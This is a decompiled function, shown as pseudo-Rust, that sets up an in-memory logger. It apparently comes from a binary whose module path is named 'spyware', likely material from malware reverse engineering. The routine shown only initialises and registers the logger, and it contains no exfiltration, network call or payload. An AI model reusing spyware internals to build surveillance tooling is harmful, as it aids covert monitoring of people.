fn spyware::logging::core::setup_logging(a0: &struct18) -> u8 {
    let v0: u128;  // [bp-0x128]
    let v1: u64;  // [bp-0x128]
    let v2: u128;  // [bp-0x118]
    let v3: u128;  // [bp-0x108]
    let v4: Result<struct48, struct13>;  // [bp-0xf8]
    let v5: struct52;  // [bp-0xe8]
    let v6: u64;  // [bp-0xd8]
    let v7: struct33;  // [bp-0xc8]
    let v8: void*;  // [bp-0xa0]
    let v9: u8;  // [bp-0x98]
    let v10: void*;  // [bp-0x90]
    let v11: u64;  // [bp-0x88]
    let v12: void*;  // [bp-0x80]
    let v13: u64;  // [bp-0x78]
    let v14: struct8;  // [bp-0x68]
    let v15: i8;  // [bp-0x60], Other Possible Types: u128
    let v16: u128;  // [bp-0x50]
    let v17: u128;  // [bp-0x40]
    let v18: u128;  // [bp-0x30]
    let v19: struct52;  // [bp-0x20]
    let v20: i8;  // [bp-0x10]
    let v22: u64;  // rax

    core::sync::atomic::atomic_store(*(a0 as &i64));
    v8 = 0;
    v9 = 0;
    v10 = 0;
    v11 = 8;
    v12 = 0;
    v13 = *((a0 + 8) as &i64) >> 2;
    v7 = struct33 {
        field_0: *(a0 as &i128)
        field_16: *((a0 + 16) as &i64)
        field_24: 0
        field_32: 0
    };
    v14 = once_cell::sync::OnceCell<T>::try_insert(&_ZN7spyware7logging4core22MEMORY_LOGGER_INSTANCE17h716e29c46813bbfaE, &v7);
    if *(&v15 as &i32) != 6 {
        v0 = v15;
        v6 = *(&v20 as &i64);
        v5 = v19;
        v4 = v18;
        v3 = v17;
        v2 = v16;
        if v1 != 6 {
            return 2;
        }
    }
    v22 = spyware::logging::core::MemoryLogger::global();
    if !v22 {
        core::option::unwrap_failed(); /* do not return */
    }
    core::result::Result<T,E>::unwrap(log::set_logger(v22, &g_4b9bc8));
    return 3;
}
